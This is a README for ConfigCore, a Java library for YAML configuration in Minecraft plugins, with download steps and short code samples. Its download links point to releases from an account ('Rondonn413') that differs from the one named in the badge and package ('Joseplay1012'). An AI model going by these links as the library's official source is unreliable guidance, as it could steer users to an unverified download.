# 🎮 ConfigCore - Easy Configuration Management for Minecraft Plugins  

[![](https://jitpack.io/v/Joseplay1012/ConfigCore.svg)](https://github.com/Rondonn413/ConfigCore/releases)  

## 🚀 Getting Started  

ConfigCore helps you manage configuration files easily within your Minecraft server plugins. This guide will walk you through downloading and running the software, even if you have no programming background.  

## 📥 Download & Install  

To get started, visit the official [ConfigCore Releases page](https://github.com/Rondonn413/ConfigCore/releases) to download the latest version.  

1. Click the link above to access the Releases page.
2. Locate the most recent version of ConfigCore.
3. Select the appropriate file type for your system (e.g., `.jar` for Java applications).
4. Click to download the file to your computer.

## ⚙️ How to Use ConfigCore  

After downloading the file, follow these steps to use ConfigCore in your project:  

### 1. Prepare Your Project  

- Create a new folder for your plugin project.
- Place the downloaded ConfigCore `.jar` file into your project’s `libs` directory.

### 2. Setup Your Configuration  

Before using ConfigCore, you need to create configuration files. Here’s how:  

- Create a YAML file named `config.yml`.
- Add your settings according to the example below:

```yaml
settings:
  example_key: "This is an example value"
```

### 3. Initialize ConfigCore  

In your Java code, initialize ConfigCore like this:

```java
import com.joseplay.configcore.AbstractConfig;

public class MyPlugin extends JavaPlugin {
    private AbstractConfig config;

    @Override
    public void onEnable() {
        config = new MyPluginConfig(this);
        config.load();
    }
}
```

### 4. Access Your Configuration  

You can now access your configuration values through the defined keys. Simply refer to your enum keys in the code:

```java
String value = config.getValue(MyEnumKey.EXAMPLE_KEY);
```

## 🔍 Features  

ConfigCore simplifies configuration management for Minecraft plugins with these key features:  

- **Unified Loading and Saving**: Automatically loads and saves YAML files.
- **Fast Value Access**: Internal caching for speed.
- **Strong Typing**: Uses enums to ensure key integrity.
- **Formatted Messages**: Automatically processes formatted messages for better readability.

## 🔧 Core Structure  

### 1. Configuration File  

- Configuration data is stored in YAML format.
- Typical files include `config.yml` and `messages.yml`.

### 2. Enum Keys  

- Each key in your configuration uses an `enum` that implements the `ConfigKey` interface.
- This helps maintain type safety and consistency.

## 🛠️ System Requirements  

To run ConfigCore, ensure you have:  

- **Java**: Version 8 or higher installed on your server.
- **Minecraft**: A server running Bukkit, Spigot, Paper, or Purpur.

Make sure to check for updates regularly on the Releases page.

## 📞 Support  

If you encounter issues while using ConfigCore, the best way to get help is to open an issue on our GitHub page. Our community is here to assist you.

## 🌐 Related Topics  

Some relevant topics that may help you better understand ConfigCore include: config, configcore, minecraft, minecraft-server, spigot, and spigot-api.

For any further assistance, visit the [ConfigCore Releases page](https://github.com/Rondonn413/ConfigCore/releases) for downloads and updates.